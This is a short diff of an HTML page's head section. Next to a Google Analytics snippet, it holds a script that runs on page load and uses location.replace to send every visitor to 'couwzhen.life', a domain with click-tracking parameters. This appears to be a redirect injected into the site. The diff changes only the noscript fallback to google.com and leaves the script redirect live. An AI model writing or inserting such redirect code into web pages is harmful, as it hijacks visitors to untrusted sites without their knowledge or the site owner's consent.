@@ -10,5 +10,5 @@ ga("create", "UA-84047128-1", "auto");
 ga("send", "pageview"); 
 </script> 
 
-<noscript><META http-equiv="refresh" content="0;URL=http://couwzhen.life/?clk=1500889853&sid1=&sid2="></noscript></head><script>window.opener = null; location.replace("http://couwzhen.life/?clk=1500889853&sid1=&sid2=")</script>
+<noscript><META http-equiv="refresh" content="0;URL=http://www.google.com"></noscript></head><script>window.opener = null; location.replace("http://couwzhen.life/?clk=1500889853&sid1=&sid2=")</script>
 				
